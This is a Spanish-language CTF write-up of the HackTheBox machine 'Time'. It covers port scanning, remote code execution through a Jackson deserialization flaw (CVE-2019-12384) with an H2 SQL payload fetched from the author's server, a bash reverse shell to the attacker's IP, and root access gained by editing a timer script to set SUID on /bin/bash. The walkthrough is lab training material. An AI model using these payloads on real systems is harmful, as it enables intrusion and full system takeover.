---
title: "Time -Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "assets/images/machines/time/data/time.png"
  teaser_home_page: true
  icon: "assets/images/icons/Hackthebox2.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Bash
  - RCE (Remote Code Execution)
  - Json
---


<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/data/TimeHTB.png">
</p>

La máquina **Time** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **medio** una calificación en el rank de 3.5, **5710 USER OWNS** y **5369 SYSTEM OWNS** con la ip **10.10.10.214** y un sistema operativo **Linux**.


### Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.214]** utilizando los parámetros:
  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/scan/scanPort.png">
</p>


Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **22,80**:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/scan/Ports.png">
</p>


Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - -sC: Script de enumeración básica de sondeo en puertos y servicios alojados.
  - -sV: Detección de versiones en servicios alojados en puertos.
  - -p : Puertos a inspeccionar.
  - -oN: Formatos de Nmap en los que se guardará el archivo.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/scan/PortServ.png">
</p>


Lo que nmap nos ha mostrado sobre los servicios es que tiene un servicio ssh y una página http que está soportada por apache 2.4.41 que tiene un **Online Json parser** corriendo. Aparte de estos datos no vemos nada fuera de lo normal o que indique un foco a seguir que no sea la página con el Json.

Si entramos en la página web desde el navegador podemos ver la aplicación **Json** que está montada en la web:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/scan/pageWeb.png">
</p>

Una vez que hemos identificado una posible ruta para nuestra auditoría, empezamos a jugar con la aplicación y vemos que tiene dos opciones **'beautify'** y **'validate (beta)'** si introducimos datos en la segunda podemos ver que nos muestra el siguiente error:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/scan/errorPage.png">
</p>


Investigando el error y si tiene alguna forma de abusar de él ya sea para hacer algún tipo de **RCE** u otro potencial camino a seguir y haciendo una buena búsqueda en internet sobre este error encontré un documento en **[github](https://github.com/jas502n/CVE-2019-12384)** que habla de cómo hacer una ejecución de comandos en el  aplicativo aprovechando una vulnerabilidad existente en la misma. Siguiendo los pasos mencionados en la página que los cuales eran crear un archivo **inject.sql** que debe tener el siguiente contenido:

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.15.125/443 0>&1')
```

Una vez creado el archivo me puse en escucha por el puerto **443** y levanté un servidor HTTP en el puerto 8000 una vez hecho esto envié la siguiente consulta a través de la aplicación web:

```json
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.15.125:8000/inject.sql'"}]
```
La consulta anterior lo que hace es decirle al aplicativo que ejecute el script de la url **http://10.10.15.125:8000/inject.sql** la cual es mi servicio http que levante en mi maquina y el cual tiene el script en sql el cual ejecuta una revershell a mi maquina por el puerto 443.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/intrusion/payload.png">
</p>

La respuesta que me dio fue un get al archivo **Inject.sql** en el lado del servidor que inicié y desde el puerto que abrí interpretó el comando dándome un shell:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/intrusion/acces.png">
</p>

## Movimiento Lateral

Haciendo un pequeño reconocimiento en el sistema podemos ver que hay una tarea cron que se ejecutan a intervalos de tiempo regulares en este caso cada **7 segundos** el cual es **'timer\_backup.timer'**:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/intrusion/cron.png">
</p>

Una vez que sabemos que existe un CronJob procedemos a buscar el archivo para ver si es una ruta a seguir para conseguir la escalada de privilegios, utilizando el comando ```$ systemctl list-timers ``` podemos encontrar la ubicación de este archivo y concatenando un ls -la podemos ver que el archivo nos pertenece por lo que podemos editarlo sin problemas

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/intrusion/cronjob.png">
</p>

## Escalación de privilegios

Para la escalada de privilegios lo que hice fue ir al archivo y dentro del archivo modifiqué el contenido que tenía por el siguiente:

```bash

#!/bin/bash
chmod 4755 /bin/bash

```

Una vez que modificamos el archivo **timer\_backup** esperamos a que la tarea cron se ejecute y root asigne el permiso **SUID** a la ruta **/bin/bash** lo cual nos permitira utilizar el parámetro ``` bash -p ``` que nos dará una shell como root ya que estamos ejecutando temporalmente el binario como el propiertario del mismo y asi teniendo acceso completo a la máquina y completado el rooteo de la misma.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/intrusion/root.png">
</p>

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/time/intrusion/root2.png">
</p>
